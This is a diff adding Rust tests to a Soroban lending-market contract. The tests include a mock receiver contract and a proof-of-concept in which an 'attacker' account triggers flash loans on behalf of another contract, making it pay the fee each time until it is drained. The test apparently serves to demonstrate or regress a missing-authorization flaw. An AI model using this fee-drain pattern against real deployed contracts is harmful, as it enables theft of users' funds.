@@ -9,8 +9,9 @@ use market::{
 };
 use soroban_fixed_point_math::FixedPoint;
 use soroban_sdk::{
-    Address, Env, map as smap,
+    Address, Env, contract, contractimpl, map as smap,
     testutils::{Address as _, Ledger},
+    token::StellarAssetClient,
 };
 
 use crate::{
@@ -22,6 +23,30 @@ fn wait(e: &Env, am: u64) {
     e.ledger().with_mut(|li| {
         li.timestamp += am;
     });
+}
+
+const SEED_CALL_AMOUNT: i128 = 10_000;
+const DRAIN_CALL_AMOUNT: i128 = 50_000;
+
+#[contract]
+pub struct FeeDrainVictimContract;
+
+#[contractimpl]
+impl FeeDrainVictimContract {
+    pub fn exec_op(e: Env, caller: Address, token: Address, amount: i128, fee_bps: i128) {
+        let sac_client = StellarAssetClient::new(&e, &token);
+        if amount == SEED_CALL_AMOUNT {
+            sac_client.mint(&e.current_contract_address(), &(amount / 10));
+        }
+
+        let repay = amount + amount.fixed_mul_ceil(fee_bps, BPS_FACTOR).unwrap();
+        sac_client.approve(
+            &e.current_contract_address(),
+            &caller,
+            &repay,
+            &(e.ledger().sequence()),
+        );
+    }
 }
 
 #[test]
@@ -865,4 +890,55 @@ fn test_positions_count_decrements_on_repay() {
 
     contract_client.withdraw(borrower_key, &gold_pool_address, &i128::MAX, &None);
     assert!(contract_client.try_get_user_obligation(borrower_key).is_err());
+}
+
+#[test]
+fn test_flash_loan_third_party_can_drain_receiver_via_fees() {
+    let TestMarketFixture {
+        e, contract_client, usdc_pool_address, users, usdc_token_client, ..
+    } = TestMarketFixture::new();
+    let lender = &users[0];
+    let attacker = &users[1];
+
+    contract_client.deposit(
+        &ObligationKey::new(lender.clone()),
+        &usdc_pool_address,
+        &DEFAULT_DEPOSIT_AMOUNT,
+        &None,
+    );
+
+    let victim_contract_id = e.register(FeeDrainVictimContract, ());
+    let usdc_pool = contract_client.get_pool(&usdc_pool_address);
+    let fee_bps = usdc_pool.config.fee_config.flash_loan_fee_bps as i128;
+    let expected_fee = DRAIN_CALL_AMOUNT.fixed_mul_ceil(fee_bps, BPS_FACTOR).unwrap();
+    assert!(expected_fee > 0);
+
+    contract_client.flash_loan(
+        &victim_contract_id,
+        lender,
+        &usdc_pool_address,
+        &SEED_CALL_AMOUNT,
+    );
+
+    let seeded_balance = usdc_token_client.balance(&victim_contract_id);
+    assert!(seeded_balance >= expected_fee);
+
+    let before_first_attack = usdc_token_client.balance(&victim_contract_id);
+    contract_client.flash_loan(
+        &victim_contract_id,
+        attacker,
+        &usdc_pool_address,
+        &DRAIN_CALL_AMOUNT,
+    );
+    let after_first_attack = usdc_token_client.balance(&victim_contract_id);
+    assert_eq!(before_first_attack - after_first_attack, expected_fee);
+
+    contract_client.flash_loan(
+        &victim_contract_id,
+        attacker,
+        &usdc_pool_address,
+        &DRAIN_CALL_AMOUNT,
+    );
+    let after_second_attack = usdc_token_client.balance(&victim_contract_id);
+    assert_eq!(after_first_attack - after_second_attack, expected_fee);
 }
